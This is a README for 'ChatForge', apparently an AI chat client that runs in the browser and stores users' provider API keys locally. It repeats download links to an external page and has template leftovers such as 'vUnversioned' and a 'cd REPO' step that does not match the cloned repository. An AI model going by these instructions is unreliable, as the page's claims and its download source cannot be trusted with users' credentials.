# ChatForge vUnversioned - AI Chat Client 2026

> **ChatForge is a local-first web AI chat client that uses your own API key to connect directly with OpenAI, Anthropic, or OpenRouter. It is distributed as a single-file application for version 2026.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Unversioned-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/zack-bennettnnh8100/chatforge-web-ai-client?style=flat-square)](https://github.com/zack-bennettnnh8100/chatforge-web-ai-client)

---

<p align="center">
  <a href="https://zack-bennettnnh8100.github.io/chatforge-web-ai-client/">
    <img src="https://img.shields.io/badge/Download-ChatForge%20Latest-brightgreen?style=for-the-badge" alt="Download ChatForge">
  </a>
</p>

> **[Download the latest ChatForge build](https://zack-bennettnnh8100.github.io/chatforge-web-ai-client/)**

---

[Download Latest Build](https://zack-bennettnnh8100.github.io/chatforge-web-ai-client/)

---

## What Is ChatForge?

ChatForge runs in the browser and follows a local-first approach to AI chat. Its streamlined interface connects to large language model providers including OpenAI, Anthropic, and OpenRouter, with authentication supplied through your own provider credentials.

The entire client is packaged in one HTML file, so installing external dependencies is unnecessary. It includes conversation history, editable system prompts, streamed output, bilingual interface support, and a dark theme for both regular chat and developer-focused testing.

---

## Capabilities

- Browser-based, local-first design
- Complete application distributed as a single HTML file
- No dependency installation required
- Bring your own API key for supported providers
- Direct provider connectivity for OpenAI, Anthropic, and OpenRouter
- Streaming output using Server-Sent Events
- Parsers for OpenAI and Anthropic protocols
- Saved conversations and customizable system prompts
- Bilingual user interface
- Dark mode
- Browser-local persistence for preferences and conversation data

---

## Getting Started

### Download the Application

1. Visit the [latest ChatForge build](https://zack-bennettnnh8100.github.io/chatforge-web-ai-client/).
2. Save the supplied HTML application.
3. Open the downloaded file with a modern web browser.

### Get the Source with Git

```bash
git clone https://github.com/zack-bennettnnh8100/chatforge-web-ai-client.git
cd REPO
```

Once the repository is available locally, open the ChatForge HTML file directly in your browser. ChatForge does not require a package manager or any dependency installation.

---

## Using ChatForge

1. Open the downloaded or cloned HTML file in a browser.
2. Pick the provider you plan to use.
3. Add that provider's API key in the application settings.
4. Select one of the provider's supported models.
5. Enter a prompt to begin chatting.
6. Set a system prompt when you need to establish specific behavior or context.
7. Reopen previous chats from the locally saved conversation history.

The supported provider connections also allow ChatForge to work with OpenAI-compatible services, including OpenRouter.

---

## Settings and Data Storage

ChatForge stores its preferences and conversations in the browser's local storage. All configuration is handled inside the application; no separate configuration file is used.

Available settings generally cover:

- Provider
- API key
- Model
- System prompt
- Interface language
- Theme

Stored keys and conversations belong to the browser profile used to run ChatForge. To delete locally retained application information, manage or clear the browser's site data.

---

## System Requirements

- A modern browser with JavaScript enabled
- Access to the ChatForge HTML file
- An API key belonging to the chosen AI provider
- Network connectivity for provider requests
- Enabled browser local storage for retaining history and settings

No runtime, package manager, server process, or installed dependencies are needed to run ChatForge.

---

## Frequently Asked Questions

### What AI providers can ChatForge connect to?

Direct provider support is available for OpenAI, Anthropic, and OpenRouter.

### Is a project environment or setup process required?

No. ChatForge is delivered as a standalone HTML file, with no dependency installation step.

### Where does ChatForge save my settings and chats?

Application preferences and conversation history are kept in local browser storage.

### Can I provide my own provider credentials?

Yes. ChatForge uses a bring-your-own-key model, so you enter the API key for the provider you select.

### What should I check if no response appears?

Confirm that the provider, model, and API key are correct. You should also check browser network access and make sure the selected provider connection is available.

### How can I install a newer ChatForge build?

Download the newest build from the project link and replace the existing HTML file. Depending on the browser storage context, locally saved data may continue to be available.

### Does ChatForge need a separate backend?

No. It is intended to run through its single-file HTML interface without a separate backend or dependency setup.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
